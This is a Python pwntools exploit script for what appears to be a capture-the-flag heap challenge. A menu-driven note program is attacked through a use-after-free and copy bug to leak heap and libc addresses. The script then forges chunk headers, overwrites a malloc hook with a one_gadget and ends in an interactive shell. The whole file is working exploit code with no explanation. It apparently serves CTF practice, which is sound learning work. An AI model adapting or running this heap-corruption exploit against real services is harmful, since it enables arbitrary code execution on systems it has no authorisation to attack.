#!/usr/bin/env python
from pwn import *
import sys

HOST = '69.90.132.248'
PORT = 1337

if(len(sys.argv)>1):
    io=remote(HOST,PORT)
    context.noptrace=True
else:
    io=process('./chall')

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)
s = lambda a : io.send(a)

def add(idx,size):
    sla("Choice: ","1")
    sla("Index: ",str(idx))
    sla("Size: ",str(size))

def edit(idx,data):
    sla("Choice: ","2")
    sla("Index: ",str(idx))
    sa("Data: ",data)

def copy(f,t):
    sla("Choice: ","3")
    sla("From: ",str(f))
    sla("To: ",str(t))

def view(idx):
    sla("Choice: ","4")
    sla("Index: ",str(idx))

def free(idx):
    sla("Choice: ","5")
    sla("Index: ",str(idx))

add(0,0x50)
add(1,0x50)

free(1)
copy(0,0)
view(0)

io.recvuntil("print: ")
heap = u64(io.recv(6)+"\x00\x00")-0x10
log.info("heap @ "+str(hex(heap)))

add(1,0x40)           # fake size
add(2,0x50)

payload = "\x00"*0x4f + "\xe1"
add(3,0x50)
edit(3,payload)
free(0)
free(2)
add(0,0x78)   # 0
add(2,0xf0)
free(1)
add(1,0xc8)
payload = p64(0)*8 + p64(0x91) + p64(1)+ p64(0)

for i in range(7):
    copy(0,0)
    edit(1,payload)

copy(0,0)
view(0)
io.recvuntil("print: ")
libc = u64(io.recv(6)+"\x00\x00")-0x1ebbe0
log.info("libc @ "+str(hex(libc)))

system = libc+0x55410
hook = libc+0x1eeb18
one = libc+0xe6e73
malloc = libc+0x1ebb70-16
m = libc+0x1ED608-16

payload = p64(0)*8 + p64(0x91) + p64(malloc)+ p64(0)
edit(1,payload)
free(2)
add(4,0x78)
payload = p64(0)+p64(one)

add(2,0x78)
edit(2,payload)
payload = p64(0)*8 + p64(0x91)+ "//bin/sh\x00"
edit(1,payload)

gdb.attach(io)
io.interactive()
